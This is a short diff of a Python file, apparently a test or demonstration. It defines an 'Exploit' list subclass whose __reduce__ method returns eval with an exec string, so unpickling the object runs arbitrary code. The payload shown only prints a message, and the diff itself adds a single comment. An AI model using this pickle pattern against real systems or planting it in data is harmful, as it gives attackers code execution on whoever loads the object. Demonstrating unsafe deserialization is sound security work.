@@ -16,6 +16,7 @@ class Exploit(list):
     def __init__(self, items):
         super().__init__(items)
 
+    # Return a list to avoid errors when unpickling
     def __reduce__(self):
         return eval, (f"exec('''print(\"Bad Pickle executes arbitrary python code\")''') or list()",), None, iter(self)
 
